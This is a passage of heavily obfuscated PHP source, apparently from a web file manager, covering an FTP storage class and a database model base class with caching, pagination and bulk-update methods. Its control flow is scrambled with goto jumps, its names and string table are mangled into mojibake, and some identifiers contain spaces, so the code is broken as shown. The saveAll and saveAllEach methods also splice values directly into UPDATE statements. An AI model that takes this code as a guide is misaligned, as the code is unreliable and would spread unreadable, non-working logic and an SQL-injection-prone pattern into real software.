$dâÄÜäçÎã . $Eİ©‘ôß‹Ù[91], $dâÄÜäçÎã . $Eİ©‘ôß‹Ù[1170])); $bàßÛ°Â = array(); foreach ($B­éÊ¯‰½ as $CØ‰£¾ß‰) { if (!strstr($CØ‰£¾ß‰, $Eİ©‘ôß‹Ù[8])) { $CØ‰£¾ß‰ = $dâÄÜäçÎã . ltrim($CØ‰£¾ß‰, $Eİ©‘ôß‹Ù[8]); } $bàßÛ°Â[] = $this->iconvApp($CØ‰£¾ß‰); } goto Aª•ŸµÈÑ; Aª•ŸµÈÑ: return $bàßÛ°Â; goto A¬Ã—ö¬ØÕ; c‚³‰×ÎÂë: $dâÄÜäçÎã = rtrim($dâÄÜäçÎã, $Eİ©‘ôß‹Ù[8]) . $Eİ©‘ôß‹Ù[8]; $B­éÊ¯‰½ = @ftp_nlist($this->connect, $dâÄÜäçÎã); if ($B­éÊ¯‰½ === !1) { $B­éÊ¯‰½ = @ftp_rawlist($this->connect, $dâÄÜäçÎã); foreach ($B­éÊ¯‰½ as $Eå‘Ğ©ñÉ¡ => $Dì¢Ö¬˜…) { $B­éÊ¯‰½[$Eå‘Ğ©ñÉ¡] = end(explode($Eİ©‘ôß‹Ù[1169], $Dì¢Ö¬˜…)); } } goto a¦ÙöÚÌÖ¦; dù®Šµ˜©¿: $Eİ©‘ôß‹Ù =& $_SERVER[¦·]; if (!$this->isFolder($dâÄÜäçÎã)) { return !1; } @ftp_chdir($this->connect, $Eİ©‘ôß‹Ù[8]); goto c‚³‰×ÎÂë; A¬Ã—ö¬ØÕ: } private function recursionFtpFiles($C·’÷±‰˜¶, &$eßæÆàØŞ) { $dÅ¤ÛÀæË˜ =& $_SERVER[¦·]; if (!$this->_isconn()) { return !1; } if (!($DğÚì¯ç Ò = $this->ftpList($C·’÷±‰˜¶))) { return !1; } foreach ($DğÚì¯ç Ò as $C·’÷±‰˜¶) { if ($this->isFolder($C·’÷±‰˜¶)) { $this->recursionFtpFiles($C·’÷±‰˜¶, $eßæÆàØŞ); $eßæÆàØŞ[$dÅ¤ÛÀæË˜[74]][] = $C·’÷±‰˜¶; } else { $eßæÆàØŞ[$dÅ¤ÛÀæË˜[73]][] = $C·’÷±‰˜¶; } } } private function objectMeta($dÂ×§ƒ«»ˆ) { goto cİğ¡ĞÉÃ©; fèõ•’©•»: return $cÄ‰†‚ã¦š; goto Fô²¿ó²İÌ; c‘½ù±’Ğƒ: if ($cÄ‰†‚ã¦š !== null && $cÄ‰†‚ã¦š !== !1) { return $cÄ‰†‚ã¦š; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $A£á¢¿ÁØ[8]); goto F­ôßÌ‘Ïæ; F­ôßÌ‘Ïæ: $e•èÔäÈ×ğ = @ftp_size($this->connect, $this->iconvSystem($dÂ×§ƒ«»ˆ)); if ($e•èÔäÈ×ğ != -1) { $cÄ‰†‚ã¦š = array($A£á¢¿ÁØ[77] => $e•èÔäÈ×ğ, $A£á¢¿ÁØ[29] => $A£á¢¿ÁØ[167]); } else { $eÄìõ‰‚§’ = @ftp_chdir($this->connect, $this->iconvSystem($dÂ×§ƒ«»ˆ)); $cÄ‰†‚ã¦š = $eÄìõ‰‚§’ ? array($A£á¢¿ÁØ[77] => 0, $A£á¢¿ÁØ[29] => $A£á¢¿ÁØ[76]) : !1; } Cache::set($F×¸íİÂæ, $cÄ‰†‚ã¦š, 0); goto fèõ•’©•»; cİğ¡ĞÉÃ©: $A£á¢¿ÁØ =& $_SERVER[¦·]; $F×¸íİÂæ = $A£á¢¿ÁØ[1171] . md5($dÂ×§ƒ«»ˆ); $cÄ‰†‚ã¦š = Cache::get($F×¸íİÂæ); goto c‘½ù±’Ğƒ; Fô²¿ó²İÌ: } } goto D„¡ÖÇ­ìÁ; dº¸àŒòø¤: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\x69\155\145", "\164\x69\155\x65", "\x69\156\163\145\x72\164\54\x75\160\x64\x61\x74\x65", "\146\165\156\x63\x74\151\x6f\156"), array("\143\162\145\x61\164\x65\124\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\x73\145\x72\x74", "\146\165\156\143\164\x69\x6f\156")); public function setDataAuto($a‡ğ¿ò¢…ù) { $this->dataAuto = $a‡ğ¿ò¢…ù; } public function __construct($d¶Ÿ„µƒø = '', $cÛŒß­¼Ë = '', $c¤»›ÆŠ = '') { parent::__construct($d¶Ÿ„µƒø, $cÛŒß­¼Ë, $c¤»›ÆŠ); } public static function textEncode($b¢™ñø½©Ÿ) { if (!$b¢™ñø½©Ÿ) { return $b¢™ñø½©Ÿ; } $c†áÕéŠ‘š = json_encode($b¢™ñø½©Ÿ); $c†áÕéŠ‘š = preg_replace_callback($_SERVER[¦·][342], function ($BòŠ¥©„‰) { return addslashes($BòŠ¥©„‰[0]); }, $c†áÕéŠ‘š); return json_decode($c†áÕéŠ‘š); } public static function textDecode($a½Ùçê“Î´) { $AŞ‘½œ”ì =& $_SERVER[¦·]; $d«Î¹Ò…ª² = json_encode($a½Ùçê“Î´); $d«Î¹Ò…ª² = preg_replace_callback($AŞ‘½œ”ì[343], function ($eºÔóÇôÁ) { return $_SERVER[¦·][93]; }, $d«Î¹Ò…ª²); return json_decode($d«Î¹Ò…ª²); } protected $tableMeta = array(); protected function _beforeInsert(&$B­ÔÑè‰, $AÑˆâÛïº¶) { $fºÁ¤ò÷Ñ® =& $_SERVER[¦·]; if (!$this->checkDataAutoHas($fºÁ¤ò÷Ñ®[344])) { return; } $this->dataBeforeFilter($B­ÔÑè‰, $fºÁ¤ò÷Ñ®[344]); } protected function _beforeUpdate(&$cìíÊ¾ùÁ¬, $Aç¨÷Õƒ”¨) { $eñ…Ä¦†Üª =& $_SERVER[¦·]; if (!$this->checkDataAutoHas($eñ…Ä¦†Üª[345])) { return; } $this->dataBeforeFilter($cìíÊ¾ùÁ¬, $eñ…Ä¦†Üª[345]); } protected function _afterSelect(&$c¶Ÿ…Ø”‘, $b­¸…™¿·ª) { if (!is_array($c¶Ÿ…Ø”‘)) { return; } if (!$this->checkDataAutoHas($_SERVER[¦·][346])) { return; } foreach ($c¶Ÿ…Ø”‘ as &$d©´æèìæò) { $this->dataAfterFilter($d©´æèìæò); } unset($d©´æèìæò); } protected function _afterFind(&$BÅÕ‘‰¬¯Ø, $fŸ†Àõ²ÏÄ) { if (!is_array($BÅÕ‘‰¬¯Ø)) { return; } if (!$this->checkDataAutoHas($_SERVER[¦·][346])) { return; } $this->dataAfterFilter($BÅÕ‘‰¬¯Ø); } public function setAutoIncrement($fÃ¦˜©µˆÍ) { $D„…ŠÛ‚ß = array($this->getPk() => $fÃ¦˜©µˆÍ); $a®ššÜÔË© = $this->data($D„…ŠÛ‚ß)->add(); if ($a®ššÜÔË©) { $this->delete($a®ššÜÔË©); } } public function getAutoIncrement() { $eÒÄÛè­¿Í = $this->getTableName(); $BôÀî–Â½ = $this->max($this->getPk()); $AËØôïô¸¬ = $this->query("\163\150\157\x77\40\164\141\x62\x6c\x65\x20\x73\x74\141\x74\165\163\40\167\x68\x65\x72\x65\x20\116\x61\x6d\x65\75\47{$eÒÄÛè­¿Í}\x27"); $b˜²ˆÁ¡«Å = $AËØôïô¸¬[0][$_SERVER[¦·][347]]; $AïÌ…×İ÷Ë = max($BôÀî–Â½, $b˜²ˆÁ¡«Å); return $AïÌ…×İ÷Ë; } protected function _callBefore($fÛÆ‹ËîŠ¬, $aœ¦‚Æ) { return $this->cacheCallCheck($fÛÆ‹ËîŠ¬, $aœ¦‚Æ, !1); } protected function _callAfter($c‡Š÷ÉÖ, $b…µÅ‚Ü®) { return $this->cacheCallCheck($c‡Š÷ÉÖ, $b…µÅ‚Ü®, !0); } protected function cacheFunctionAlias($EùÖ•ê”« ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D°ºÈëœ«, $bƒ›ƒªÉãÑ, $añ‘¿ôª’‘ = false) { $b¡ ÏÂŞÍï = $this->cacheFunctionAlias($bƒ›ƒªÉãÑ); if (!$b¡ ÏÂŞÍï) { return; } foreach ($b¡ ÏÂŞÍï as $eÖ÷£¸ôí… => $bİ½Ü‚ÃÊİ) { $bÑù…äÉ¡® = $bİ½Ü‚ÃÊİ[0]; $b­ø•¥²İÉ = explode($_SERVER[¦·][47], $bİ½Ü‚ÃÊİ[1]); if ($D°ºÈëœ« == $eÖ÷£¸ôí…) { return $this->cacheFunctionGet($eÖ÷£¸ôí…, $bÑù…äÉ¡®); } if ($añ‘¿ôª’‘ && in_array($D°ºÈëœ«, $b­ø•¥²İÉ)) { $this->cacheFunctionClear($eÖ÷£¸ôí…, $bÑù…äÉ¡®); } } } public function cacheFunctionGet($CÛÖõ¦´ä†, $cïò‚Ã÷ö½) { $cï¿ñö¢Ãù = $this->cacheKeyMake($CÛÖõ¦´ä†, $cïò‚Ã÷ö½); $b ¾„ÖÑ÷í = Cache::get($cï¿ñö¢Ãù); if (!is_array($b ¾„ÖÑ÷í)) { $b ¾„ÖÑ÷í = call_user_func_array(array($this, $CÛÖõ¦´ä†), array($cïò‚Ã÷ö½, !0)); Cache::set($cï¿ñö¢Ãù, $b ¾„ÖÑ÷í); } return $b ¾„ÖÑ÷í; } public function cacheFunctionClear($c÷à›‡²Å¥, $f­¢†“ƒÁÑ) { $d¿Ùğ½ñÅ = $f­¢†“ƒÁÑ; if (!is_array($f­¢†“ƒÁÑ)) { $d¿Ùğ½ñÅ = array($f­¢†“ƒÁÑ); } foreach ($d¿Ùğ½ñÅ as $fô‚ø”¥°) { $e±¡œÁ÷Ù = $this->cacheKeyMake($c÷à›‡²Å¥, $fô‚ø”¥°); Cache::remove($e±¡œÁ÷Ù); } } private function cacheKeyMake($C¦í›®ÖšÓ, $cÏöâéÄõŠ) { $Cë¨á„½‰ =& $_SERVER[¦·]; return get_class($this) . $Cë¨á„½‰[70] . $C¦í›®ÖšÓ . $Cë¨á„½‰[348] . $cÏöâéÄõŠ; } protected function selectPage($c¹ÏÀğ…¸ = 200, $C˜µ“ºÚ› = 1) { goto fâ†¢†“ñî; bÑ™›­ö³Å: if ($BÛ¹½¢ë·õ == 1) { $D†àîä„‹ä = count($bÍäóÅ³Ÿ«); } $f½íİëœËã = array($e‘Ö°âÌ[351] => array($e‘Ö°âÌ[352] => $D†àîä„‹ä, $e‘Ö°âÌ[349] => $c¹ÏÀğ…¸, $e‘Ö°âÌ[340] => $C˜µ“ºÚ›, $e‘Ö°âÌ[353] => $BÛ¹½¢ë·õ), $e‘Ö°âÌ[354] => $bÍäóÅ³Ÿ« ? $bÍäóÅ³Ÿ« : array()); return $f½íİëœËã; goto F†æƒÏŒÔ; Bø¼ÆÑÆ°Ô: $BÛ¹½¢ë·õ = ceil($D†àîä„‹ä / $c¹ÏÀğ…¸); $C˜µ“ºÚ› = intval(isset($in[$e‘Ö°âÌ[340]]) ? $in[$e‘Ö°âÌ[340]] : $C˜µ“ºÚ›); $C˜µ“ºÚ› = $C˜µ“ºÚ› <= 1 ? 1 : ($C˜µ“ºÚ› >= $BÛ¹½¢ë·õ ? $BÛ¹½¢ë·õ : $C˜µ“ºÚ›); goto bÌãºŸæÔ; fâ†¢†“ñî: $e‘Ö°âÌ =& $_SERVER[¦·]; global $in; $aˆ˜îã°ÅÔ = $this->optionsValue(); goto E¸³¬²ÛÑ; bÌãºŸæÔ: $this->optionsValue($aˆ˜îã°ÅÔ); $bÍäóÅ³Ÿ« = $this->page($C˜µ“ºÚ›, $c¹ÏÀğ…¸)->select(); $bÍäóÅ³Ÿ« = is_array($bÍäóÅ³Ÿ«) ? $bÍäóÅ³Ÿ« : array(); goto bÑ™›­ö³Å; D„ŸíÑÎ³: $CÅ»˜½Ã = $aˆ˜îã°ÅÔ; $CÅ»˜½Ã[$e‘Ö°âÌ[350]] = array(); $this->optionsValue($CÅ»˜½Ã); goto D»¬ëˆˆ¨; D»¬ëˆˆ¨: $D†àîä„‹ä = intval($this->count()); $c¹ÏÀğ…¸ = intval($c¹ÏÀğ…¸); $c¹ÏÀğ…¸ = $c¹ÏÀğ…¸ <= 5 ? 5 : ($c¹ÏÀğ…¸ >= $E‡Ö·Ì±ùó ? $E‡Ö·Ì±ùó : $c¹ÏÀğ…¸); goto Bø¼ÆÑÆ°Ô; E¸³¬²ÛÑ: $E‡Ö·Ì±ùó = 4000; $c¹ÏÀğ…¸ = isset($in[$e‘Ö°âÌ[349]]) ? $in[$e‘Ö°âÌ[349]] : $c¹ÏÀğ…¸; if ($c¹ÏÀğ…¸ === -1) { unset($in[$e‘Ö°âÌ[349]]); $E‡Ö·Ì±ùó = 100000000; $c¹ÏÀğ…¸ = $E‡Ö·Ì±ùó; } goto D„ŸíÑÎ³; F†æƒÏŒÔ: } protected function checkLength($Aœˆß Ñ , $b®Šëë†ø = 0, $BºÓ·ù› = '') { $bàğ¿èµ¯… =& $_SERVER[¦·]; $b®Šëë†ø = $b®Šëë†ø ? $b®Šëë†ø : 65536; if (!$Aœˆß Ñ  || strlen($Aœˆß Ñ ) < $b®Šëë†ø) { return; } $BºÓ·ù› = $BºÓ·ù› ? $BºÓ·ù› . $bàğ¿èµ¯…[67] : $bàğ¿èµ¯…[33]; show_json($BºÓ·ù› . LNG($bàğ¿èµ¯…[355]) . "\50{$b®Šëë†ø}\51", !1); } protected function metaSet($CÅ›¤Ù®‡, $a¤×á²Íäø = null, $d”¬È­ôÊ = null) { goto a»Ó­ÃÓ¡­; d¼«æøñ©Û: $DÃÚÍß·Ã = $this->tableMeta[$c¹ÑÁßïà½[357]]; $cí·šÀ— = Model($DÃÚÍß·Ã); $BªÓ¸ÓñÜí = array($a¨Ù«½·…Õ => $CÅ›¤Ù®‡, $c¹ÑÁßïà½[358] => $a¤×á²Íäø); goto aŒ‘…Š¾Ÿ„; a»Ó­ÃÓ¡­: $c¹ÑÁßïà½ =& $_SERVER[¦·]; if (!$this->tableMeta) { return !1; } $a¨Ù«½·…Õ = $this->tableMeta[$c¹ÑÁßïà½[356]]; goto d¼«æøñ©Û; dØ¥ó…£Üº: if (is_string($a¤×á²Íäø)) { $b„Ì½Š¸“Ë[$a¤×á²Íäø] = $d”¬È­ôÊ; } $eø½†çåšÖ = array(); foreach ($b„Ì½Š¸“Ë as $e÷øº‰Õ‘ => $BºŠöÛˆº) { $this->checkLength($BºŠöÛˆº, !1, $DÃÚÍß·Ã . $c¹ÑÁßïà½[4] . $e÷øº‰Õ‘); $eø½†çåšÖ[] = array($a¨Ù«½·…Õ => $CÅ›¤Ù®‡, $c¹ÑÁßïà½[89] => $e÷øº‰Õ‘, $c¹ÑÁßïà½[359] => $BºŠöÛˆº); } goto cã‡Ğîœ£Ä; aŒ‘…Š¾Ÿ„: if (is_null($a¤×á²Íäø)) { return $cí·šÀ—->where(array($a¨Ù«½·…Õ => $CÅ›¤Ù®‡))->delete(); } if (is_null($d”¬È­ôÊ) && is_string($a¤×á²Íäø)) { return $cí·šÀ—->where($BªÓ¸ÓñÜí)->delete(); } $b„Ì½Š¸“Ë = is_array($a¤×á²Íäø) ? $a¤×á²Íäø : array(); goto dØ¥ó…£Üº; cã‡Ğîœ£Ä: $cí·šÀ—->where(array($a¨Ù«½·…Õ => $CÅ›¤Ù®‡))->addAll($eø½†çåšÖ, array(), !0); return !0; goto A ˆİ¦õ§; A ˆİ¦õ§: } public function metaGet($Bé»ÈÅø•Ñ, $aò°Œğ˜Õ£ = false) { goto Aï²„ìë¸ï; Aï²„ìë¸ï: $eÕ¹Ö››†† =& $_SERVER[¦·]; if (!$this->tableMeta) { return array(); } $c†¨¬ÚŠØá = $this->tableMeta[$eÕ¹Ö››††[356]]; goto dßÍŠĞÅÔï; dßÍŠĞÅÔï: $d×ùºÓİíğ = Model($this->tableMeta[$eÕ¹Ö››††[357]]); if ($aò°Œğ˜Õ£) { $bëˆİâÛòƒ = array($c†¨¬ÚŠØá => $Bé»ÈÅø•Ñ, $eÕ¹Ö››††[89] => $aò°Œğ˜Õ£); return $d×ùºÓİíğ->where($bëˆİâÛòƒ)->getField($eÕ¹Ö››††[359]); } $bëˆİâÛòƒ = array($c†¨¬ÚŠØá => $Bé»ÈÅø•Ñ); goto Eé¹Âù¸´¹; Eé¹Âù¸´¹: $dÏÕõËê¸ = $d×ùºÓİíğ->field($eÕ¹Ö››††[360])->where($bëˆİâÛòƒ)->select(); $dÏÕõËê¸ = array_to_keyvalue($dÏÕõËê¸, $eÕ¹Ö››††[89], $eÕ¹Ö››††[359]); return $dÏÕõËê¸; goto Bëî¦¥ª·ë; Bëî¦¥ª·ë: } private function checkDataAutoHas($A¯¿‚Ñ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $a²ÏÒÙÏ) { if (in_array($A¯¿‚Ñ, explode($_SERVER[¦·][47], $a²ÏÒÙÏ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b±Ğ›…ŠÇ, $D§¶­¯½Èê) { $a¡àëˆƒá¥ =& $_SERVER[¦·]; foreach ($this->dataAuto as $E³˜‘Ó¦…±) { $C‡²ÌÆğÖñ = $E³˜‘Ó¦…±[0]; if (!in_array($D§¶­¯½Èê, explode($a¡àëˆƒá¥[47], $E³˜‘Ó¦…±[2]))) { continue; } switch (trim($E³˜‘Ó¦…±[3])) { case $a¡àëˆƒá¥[309]: case $a¡àëˆƒá¥[310]: $bÜ˜Ö„¸Î‡ = $E³˜‘Ó¦…±[1]; $Ağ‚ºÇÜé = isset($E³˜‘Ó¦…±[4]) ? (array) $E³˜‘Ó¦…±[4] : array(); if ($bÜ˜Ö„¸Î‡ == $a¡àëˆƒá¥[190] && array_key_exists($C‡²ÌÆğÖñ, $b±Ğ›…ŠÇ)) { if (!$b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]) { unset($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]); } break; } if (isset($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ])) { array_unshift($Ağ‚ºÇÜé, $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]); } if ($a¡àëˆƒá¥[309] == $E³˜‘Ó¦…±[3]) { $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] = call_user_func_array($bÜ˜Ö„¸Î‡, $Ağ‚ºÇÜé); } else { $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] = call_user_func_array(array(&$this, $bÜ˜Ö„¸Î‡), $Ağ‚ºÇÜé); } break; case $a¡àëˆƒá¥[261]: $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] = $b±Ğ›…ŠÇ[$E³˜‘Ó¦…±[1]]; break; case $a¡àëˆƒá¥[282]: if (isset($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]) && !is_string($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ])) { $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] = json_encode_force($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]); } break; case $a¡àëˆƒá¥[311]: if ($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] === $a¡àëˆƒá¥[33]) { unset($b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ]); } break; case $a¡àëˆƒá¥[312]: $b±Ğ›…ŠÇ[$C‡²ÌÆğÖñ] = $E³˜‘Ó¦…±[1]; default: break; } } if ($D§¶­¯½Èê == $a¡àëˆƒá¥[344]) { $AÆ„¸ˆÑë = strtolower($this->db->getDbType()); if (strpos($AÆ„¸ˆÑë, $a¡àëˆƒá¥[9]) !== 0) { return; } $dìå÷¯ÊæÎ = $this->field(!0)->fields; $F‰³ÃÚš²½ = $dìå÷¯ÊæÎ[$a¡àëˆƒá¥[240]]; if (isset($dìå÷¯ÊæÎ[$a¡àëˆƒá¥[239]])) { unset($F‰³ÃÚš²½[$dìå÷¯ÊæÎ[$a¡àëˆƒá¥[239]]]); } foreach ($F‰³ÃÚš²½ as $Dá»‹—¨šš => $D§¶­¯½Èê) { if (!isset($b±Ğ›…ŠÇ[$Dá»‹—¨šš])) { $b±Ğ›…ŠÇ[$Dá»‹—¨šš] = $a¡àëˆƒá¥[33]; } } } } private function dataAfterFilter(&$CƒÂÁº·Ê) { $Dö–öŒ‚ö =& $_SERVER[¦·]; foreach ($this->dataAuto as $eÇÄ‹Ï›í¿) { $DÇÊ†íù»ˆ = $eÇÄ‹Ï›í¿[0]; if (!in_array($Dö–öŒ‚ö[346], explode($Dö–öŒ‚ö[47], $eÇÄ‹Ï›í¿[2]))) { continue; } if (!isset($CƒÂÁº·Ê[$DÇÊ†íù»ˆ])) { continue; } switch (trim($eÇÄ‹Ï›í¿[3])) { case $Dö–öŒ‚ö[309]: case $Dö–öŒ‚ö[310]: $f¸‹ƒ¯±ªù = isset($eÇÄ‹Ï›í¿[4]) ? (array) $eÇÄ‹Ï›í¿[4] : array(); array_unshift($f¸‹ƒ¯±ªù, $CƒÂÁº·Ê[$DÇÊ†íù»ˆ]); if ($Dö–öŒ‚ö[309] == $eÇÄ‹Ï›í¿[3]) { $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = call_user_func_array($eÇÄ‹Ï›í¿[1], $f¸‹ƒ¯±ªù); } else { $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = call_user_func_array(array(&$this, $eÇÄ‹Ï›í¿[1]), $f¸‹ƒ¯±ªù); } break; case $Dö–öŒ‚ö[261]: $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = $CƒÂÁº·Ê[$eÇÄ‹Ï›í¿[1]]; break; case $Dö–öŒ‚ö[282]: $b‹ÏÆì˜Ğ† = $CƒÂÁº·Ê[$DÇÊ†íù»ˆ]; $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = json_decode($b‹ÏÆì˜Ğ†, !0); if (is_null($CƒÂÁº·Ê[$DÇÊ†íù»ˆ])) { $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = $b‹ÏÆì˜Ğ†; } break; case $Dö–öŒ‚ö[311]: if ($CƒÂÁº·Ê[$DÇÊ†íù»ˆ] === $Dö–öŒ‚ö[33]) { unset($CƒÂÁº·Ê[$DÇÊ†íù»ˆ]); } break; case $Dö–öŒ‚ö[312]: $CƒÂÁº·Ê[$DÇÊ†íù»ˆ] = $eÇÄ‹Ï›í¿[1]; default: break; } } } public function saveAll($EÃèëÀšâø) { goto bæ©ÔÂ…à; aŞÅó¬»‚: $EÃèëÀšâø = is_array($EÃèëÀšâø) ? $EÃèëÀšâø : array(); $F«ÅªÚÄÌ¹ = $b°Â¨¹ØÓ[361]; $a„¹¤’´Ù = 0; goto c¹¤Ù—Ç‰†; bæ©ÔÂ…à: $b°Â¨¹ØÓ =& $_SERVER[¦·]; $b£ë—Ê›¨÷ = $this->tablePrefix . $this->tableName; $d·™Çç°çŠ = self::SQL_WHERE_IN_CHUNK; goto aŞÅó¬»‚; c¹¤Ù—Ç‰†: $a¼­Àâ…Ù… = array(); $Eëê Â“ = count($EÃèëÀšâø); for ($FˆùÃÊŞÆÖ = 0; $FˆùÃÊŞÆÖ < $Eëê Â“; $FˆùÃÊŞÆÖ++) { $dèÊ±óÊÊ£ = $EÃèëÀšâø[$FˆùÃÊŞÆÖ]; if (!is_array($dèÊ±óÊÊ£) || count($dèÊ±óÊÊ£) != 4) { continue; } $f¹˜ïç©©Ô = "\x55\120\x44\101\124\x45\40\140{$b£ë—Ê›¨÷}\x60\x20\x53\x45\124\40{$dèÊ±óÊÊ£[2]}\40\75\x20\x43\101\123\x45\x20{$dèÊ±óÊÊ£[0]}\40\xa"; if ($a„¹¤’´Ù == 0) { $F«ÅªÚÄÌ¹ = $f¹˜ïç©©Ô; } $a¼­Àâ…Ù…[] = $b°Â¨¹ØÓ[113] . $dèÊ±óÊÊ£[1] . $b°Â¨¹ØÓ[113]; $a„¹¤’´Ù++; $F«ÅªÚÄÌ¹ .= "\x20\127\110\x45\x4e\x20\47{$dèÊ±óÊÊ£[1]}\x27\40\x54\110\x45\116\40\x27{$dèÊ±óÊÊ£[3]}\47\40\12"; if ($a„¹¤’´Ù == $d·™Çç°çŠ || $FˆùÃÊŞÆÖ == $Eëê Â“ - 1) { goto e“òª‰—’; b§ó¯Š²Œ: $a„¹¤’´Ù = 0; $F«ÅªÚÄÌ¹ = $f¹˜ïç©©Ô; $this->chunkEventCheck(count($a¼­Àâ…Ù…)); goto F‘Œ‚Ê›ÔÇ; F‘Œ‚Ê›ÔÇ: $a¼­Àâ…Ù… = array(); goto A³¨î¯¾»¿; e“òª‰—’: $Aº®Î«¥Õ = implode($b°Â¨¹ØÓ[47], $a¼­Àâ…Ù…); $F«ÅªÚÄÌ¹ .= "\40\x45\116\x44\40\40\x57\110\x45\x52\x45\40{$dèÊ±óÊÊ£[0]}\40\x49\116\x20\x28{$Aº®Î«¥Õ}\x29\40"; $this->execute($F«ÅªÚÄÌ¹); goto b§ó¯Š²Œ; A³¨î¯¾»¿: } } goto aÈà… §ÜÒ; aÈà… §ÜÒ: $this->chunkEventSet(); goto dõÉŸ‘«µÉ; dõÉŸ‘«µÉ: } public function saveAllEach($E«†ßî¶³Ã) { $C‰ÂÎùÌ =& $_SERVER[¦·]; $C˜ËÁ’Ø = $this->tablePrefix . $this->tableName; foreach ($E«†ßî¶³Ã as $eÔê†´‘ªÇ) { if (!is_array($eÔê†´‘ªÇ) || count($eÔê†´‘ªÇ) != 4) { continue; } $Aï»Ë«¤‘ = $eÔê†´‘ªÇ[0] . $C‰ÂÎùÌ[362] . $eÔê†´‘ªÇ[1] . $C‰ÂÎùÌ[113]; $A§“˜£É† = $eÔê†´‘ªÇ[2] . $C‰ÂÎùÌ[362] . $eÔê†´‘ªÇ[3] . $C‰ÂÎùÌ[113]; $d”çÙÉÁ‘ñ = "\165\160\x64\x61\x74\145\40{$C˜ËÁ’Ø}\x20\x73\145\x74\x20{$A§“˜£É†}\x20\x77\x68\x65\x72\x65\x20{$Aï»Ë«¤‘}\73"; $this->execute($d”çÙÉÁ‘ñ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e·İ“ï¶„ = false, $eÌé·Ñê£Ç = false) { $this->_chunkEvent = $e·İ“ï¶„; $this->_chunkEventParam = $eÌé·Ñê£Ç; } private function chunkEventCheck($D³Ä„„»Ÿƒ) { if (!$this->_chunkEvent) { return; } $f´¥Ÿ¶©½æ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $f´¥Ÿ¶©½æ[$_SERVER[¦·][363]] = $D³Ä„„»Ÿƒ; Hook::trigger($this->_chunkEvent, $f´¥Ÿ¶©½æ); } public function addAll($aŸÖÜˆÈËŒ, $E„ÓÆñ›à = array(), $bõÙ—áİ‘í = false) { goto d»Åï—ÙÑâ; d¾œ„ŒÌ—: if (empty($aŸÖÜˆÈËŒ)) { $this->error = think_lang($cŒíŸ£Šù[259]); return !1; } $E„ÓÆñ›à = $this->_parseOptions($E„ÓÆñ›à); foreach ($aŸÖÜˆÈËŒ as $DÁù”ÊÈÁ => $E±£Ş‡øâ) { $aŸÖÜˆÈËŒ[$DÁù”ÊÈÁ] = $this->_facade($E±£Ş‡øâ); $this->_beforeInsert($aŸÖÜˆÈËŒ[$DÁù”ÊÈÁ], $E„ÓÆñ›à); } goto c–ëªõ´ïŸ; c–ëªõ´ïŸ: if (method_exists($this->db, $cŒíŸ£Šù[260])) { for ($a™†ªÇ‹‡¯ = 0; $a™†ªÇ‹‡¯ < count($aŸÖÜˆÈËŒ); $a™†ªÇ‹‡¯ += $eÖ­íÖÊë¬) { $A¥™¡·ï½Á = array_slice($aŸÖÜˆÈËŒ, $a™†ªÇ‹‡¯, $eÖ­íÖÊë¬); if (!is_array($A¥™¡·ï½Á) || count($A¥™¡·ï½Á) == 0) { break; } $AÒ‡‘Œøô = $this->db->insertAll($A¥™¡·ï½Á, $E„ÓÆñ›à, $bõÙ—áİ‘í); $this->chunkEventCheck(count($A¥™¡·ï½Á)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aŸÖÜˆÈËŒ as $DÁù”ÊÈÁ => $E±£Ş‡øâ) { $AÒ‡‘Œøô = $this->db->insert($E±£Ş‡øâ, $E„ÓÆñ›à, $bõÙ—áİ‘í); } $this->commit(); } if (!1 !== $AÒ‡‘Œøô) { $bŒ‡ÔÜµê“ = $this->getLastInsID(); if ($bŒ‡ÔÜµê“) { return $bŒ‡ÔÜµê“; } } return $AÒ‡‘Œøô; goto CøÈğ¦ÉÔÌ; d»Åï—ÙÑâ: $cŒíŸ£Šù =& $_SERVER[¦·]; ignore_timeout(); $eÖ­íÖÊë¬ = self::SQL_WHERE_IN_CHUNK; goto d¾œ„ŒÌ—; CøÈğ¦ÉÔÌ: } public function save($A¶Ø¶Üôˆˆ = '', $BÌ“øÂ«œ = array()) { goto EÙÉŒ¿ÑœŠ; EÙÉŒ¿ÑœŠ: $Bùå›àŠƒŞ =& $_SERVER[¦·]; $EÁ§çÃÀ‹• = self::SQL_WHERE_IN_CHUNK; $FÍåã©äšª = $this->optionsValue(); goto cóƒ•é’ø; f‹¦§æ¥Ã: $E«ƒƒĞ¿—Å = $FÍåã©äšª[$Bùå›àŠƒŞ[263]][$cĞ­çƒ†ˆ][1]; $E«ƒƒĞ¿—Å = is_array($E«ƒƒĞ¿—Å) ? $E«ƒƒĞ¿—Å : array(); $D–¦Ãˆİ™ˆ = count($E«ƒƒĞ¿—Å); goto D±ìĞ¦šòä; D±ìĞ¦šòä: for ($AÚç¯«‘Ñ = 0; $AÚç¯«‘Ñ < $D–¦Ãˆİ™ˆ; $AÚç¯«‘Ñ += $EÁ§çÃÀ‹•) { $EŠâÄ¿×Õ = 